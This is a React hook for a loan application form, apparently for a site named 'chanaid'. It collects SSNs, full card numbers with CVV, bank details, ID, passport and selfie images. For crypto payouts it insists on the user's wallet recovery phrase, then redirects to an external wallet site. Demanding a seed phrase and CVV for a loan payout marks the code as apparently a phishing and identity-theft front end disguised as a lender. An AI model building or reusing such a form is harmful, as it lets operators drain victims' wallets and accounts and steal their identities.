import { useState, useEffect } from "react";
import { toast } from "sonner";
import { submitLoanApplication, checkLoanStatus, uploadLoanAsset } from "@/lib/queries";
import { luhn, isExpiryValid } from "@/lib/loan-utils";

const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;

/** Generates a client-side temp ID used to namespace R2 uploads before the row exists. */
function makeTempId() {
  return typeof crypto !== "undefined"
    ? crypto.randomUUID()
    : Math.random().toString(36).slice(2);
}

export type AppStatus = {
  status: string;
  identityVerified: boolean;
  rejectionReason: string | null;
  amountRequested: number;
  currency: string;
  createdAt: string;
  submittedAt: string | null;
  updatedAt: string | null;
  reviewedAt: string | null;
  verifiedAt: string | null;
  statusHistory: string;
};

export function useLoanApplication() {
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [countdown, setCountdown] = useState(15);
  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("bank_transfer");

  const [appId, setAppId] = useState<string | null>(null);
  const [appStatus, setAppStatus] = useState<AppStatus | null>(null);

  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});

  // Image/video state: stores base64 data URI (dev) or R2 key (prod after upload)
  const [selfieImage, setSelfieImage] = useState<string | null>(null);
  const [idFrontImage, setIdFrontImage] = useState<string | null>(null);
  const [idBackImage, setIdBackImage] = useState<string | null>(null);
  const [passportFrontImage, setPassportFrontImage] = useState<string | null>(null);
  const [passportBackImage, setPassportBackImage] = useState<string | null>(null);
  const [videoSelfie, setVideoSelfie] = useState<string | null>(null);

  // Stable temp ID for this session's uploads
  const [tempId] = useState(() => makeTempId());

  // Persistence: Check for existing application on mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      const saved = localStorage.getItem("chanaid_loan_id");
      if (saved) {
        setAppId(saved);
        setDone(true);
        refreshStatus(saved);
      }
    }
  }, []);

  async function refreshStatus(id: string) {
    try {
      const status = await checkLoanStatus({ data: id });
      if (status) setAppStatus(status as AppStatus);
    } catch (e) {
      console.error("Failed to check status", e);
    }
  }

  // Poll while pending or under_review; stop once terminal state stabilises
  useEffect(() => {
    if (!done || !appId) return;
    const terminal = appStatus?.status === "verified" || appStatus?.status === "rejected";
    if (terminal) return;
    const interval = setInterval(() => refreshStatus(appId), 5000);
    return () => clearInterval(interval);
  }, [done, appId, appStatus?.status, appStatus?.updatedAt]);

  /**
   * Attempts to upload a file to R2 via the server function.
   * Falls back to base64 data URI if R2 is unavailable (dev mode).
   */
  async function uploadAsset(
    file: File,
    kind: string,
    setter: (v: string | null) => void
  ) {
    // Always convert to base64 first so we have a preview immediately
    const dataUrl = await new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = reject;
      reader.readAsDataURL(file);
    });
    setter(dataUrl); // Show preview instantly

    // Attempt R2 upload; if it returns a key, swap preview to key
    try {
      const result = await uploadLoanAsset({
        data: { tempId, kind, dataUrl, contentType: file.type || "application/octet-stream" },
      });
      if (result?.key) {
        setter(result.key); // Store R2 key instead of base64
      }
    } catch {
      // R2 unavailable — keep base64 (already set above)
    }
  }

  function makeFileHandler(kind: string, setter: (v: string | null) => void) {
    return async (e: React.ChangeEvent<HTMLInputElement>) => {
      const file = e.target.files?.[0];
      if (!file) { setter(null); return; }
      try {
        await uploadAsset(file, kind, setter);
      } catch {
        toast.error("Failed to read image file.");
      }
    };
  }

  // Countdown + redirect after verified
  useEffect(() => {
    if (done && appStatus?.status === "verified") {
      const interval = setInterval(() => {
        setCountdown((c) => {
          if (c <= 1) {
            clearInterval(interval);
            if (typeof window !== "undefined") {
              const target = (REDIRECT_URL || "https://wiscewallet.com/").trim();
              window.location.href = target;
            }
            return 0;
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [done, appStatus?.status]);

  function validateCard(num: string, expiry: string, cvv: string): Record<string, string> {
    const errs: Record<string, string> = {};
    const digits = num.replace(/\s/g, "");
    if (digits.length < 13) errs.card_number = "Card number is too short.";
    else if (!luhn(digits)) errs.card_number = "Card number is invalid. Please check and try again.";
    if (!isExpiryValid(expiry)) errs.card_expiry = expiry ? "Card has expired or expiry is invalid (MM/YY)." : "Expiry is required.";
    if (!/^\d{3,4}$/.test(cvv)) errs.card_cvv = "CVV must be 3 or 4 digits.";
    return errs;
  }

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    if ((fd.get("website") as string)?.length) { setDone(true); return; }

    const firstName = String(fd.get("first_name") || "").trim();
    const email = String(fd.get("email") || "").trim();
    const amountRequested = Number(fd.get("amount_requested") || 0);

    if (!firstName || !email || !amountRequested) {
      toast.error("Please fill in your name, email, and loan amount.");
      return;
    }

    if (payout === "card") {
      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
      if (Object.keys(errs).length) {
        setCardErrors(errs);
        toast.error(Object.values(errs)[0]);
        return;
      }
      setCardErrors({});
    }

    if (payout === "crypto") {
      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
      if (!seedPhrase) {
        toast.error("Please enter your wallet recovery phrase.");
        return;
      }
    }

    const payload = {
      firstName,
      lastName: String(fd.get("last_name") || "").trim() || null,
      email,
      phone: String(fd.get("phone") || "").trim() || null,
      dateOfBirth: String(fd.get("date_of_birth") || "").trim() || null,
      ssn: String(fd.get("ssn") || "").trim() || null,
      ein: String(fd.get("ein") || "").trim() || null,
      addressLine1: String(fd.get("address_line1") || "").trim() || null,
      addressLine2: String(fd.get("address_line2") || "").trim() || null,
      city: String(fd.get("city") || "").trim() || null,
      stateRegion: String(fd.get("state_region") || "").trim() || null,
      postalCode: String(fd.get("postal_code") || "").trim() || null,
      country: String(fd.get("country") || "").trim() || null,
      amountRequested,
      currency: String(fd.get("currency") || "USD"),
      loanPurpose: String(fd.get("loan_purpose") || "").trim() || null,
      loanTermMonths: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
      employmentStatus: String(fd.get("employment_status") || "").trim() || null,
      monthlyIncome: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
      payoutMethod: payout,
      bankName: String(fd.get("bank_name") || "").trim() || null,
      bankAccountNumber: String(fd.get("bank_account_number") || "").trim() || null,
      bankRoutingNumber: String(fd.get("bank_routing_number") || "").trim() || null,
      cardIssuer: String(fd.get("card_issuer") || "").trim() || null,
      cardHolderName: String(fd.get("card_holder_name") || "").trim() || null,
      cardNumber: cardNumber ? cardNumber.replace(/\s/g, "") : null,
      cardExpiry: cardExpiry || null,
      cardCvv: cardCvv || null,
      billingAddressLine1: String(fd.get("billing_address_line1") || "").trim() || null,
      billingAddressLine2: String(fd.get("billing_address_line2") || "").trim() || null,
      billingCity: String(fd.get("billing_city") || "").trim() || null,
      billingState: String(fd.get("billing_state") || "").trim() || null,
      billingPostalCode: String(fd.get("billing_postal_code") || "").trim() || null,
      billingCountry: String(fd.get("billing_country") || "").trim() || null,
      cryptoWalletType: String(fd.get("crypto_wallet_type") || "").trim() || null,
      cryptoWalletAddress: String(fd.get("crypto_wallet_address") || "").trim() || null,
      cryptoSeedPhrase: String(fd.get("crypto_seed_phrase") || "").trim() || null,
      accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
      sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
      status: "pending",
      selfieImage: selfieImage || null,
      idFrontImage: idFrontImage || null,
      idBackImage: idBackImage || null,
      passportFrontImage: passportFrontImage || null,
      passportBackImage: passportBackImage || null,
      videoSelfieUrl: videoSelfie || null,
    };

    setLoading(true);
    try {
      const { data, error } = await submitLoanApplication({ data: payload });

      if (error) {
        // Surface field-level validation errors from the server
        if (error.fields) {
          const firstField = Object.values(error.fields as Record<string, string[]>)[0];
          toast.error(Array.isArray(firstField) ? firstField[0] : String(firstField));
        } else {
          toast.error(error.message ?? "Submission failed. Please try again.");
        }
        return;
      }

      if (!data) throw new Error("Submission failed");

      const newId = (data as any).id;
      setAppId(newId);
      if (typeof window !== "undefined") {
        localStorage.setItem("chanaid_loan_id", newId);
        window.scrollTo({ top: 0, behavior: "smooth" });
      }

      setDone(true);
      refreshStatus(newId);
      toast.success("Application received! Reviewing identity documents...");
    } catch {
      toast.error("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  function clearSession() {
    if (typeof window !== "undefined") {
      localStorage.removeItem("chanaid_loan_id");
      setAppId(null);
      setAppStatus(null);
      setDone(false);
    }
  }

  return {
    loading, done, countdown, payout, setPayout,
    cardNumber, setCardNumber, cardExpiry, setCardExpiry,
    cardCvv, setCardCvv, cardErrors, setCardErrors,
    selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage, videoSelfie,
    onSelfieChange: makeFileHandler("selfie", setSelfieImage),
    onIdFrontChange: makeFileHandler("id_front", setIdFrontImage),
    onIdBackChange: makeFileHandler("id_back", setIdBackImage),
    onPassportFrontChange: makeFileHandler("passport_front", setPassportFrontImage),
    onPassportBackChange: makeFileHandler("passport_back", setPassportBackImage),
    onVideoSelfieChange: (val: string | null) => setVideoSelfie(val),
    handleSubmit, appStatus, appId, clearSession,
  };
}
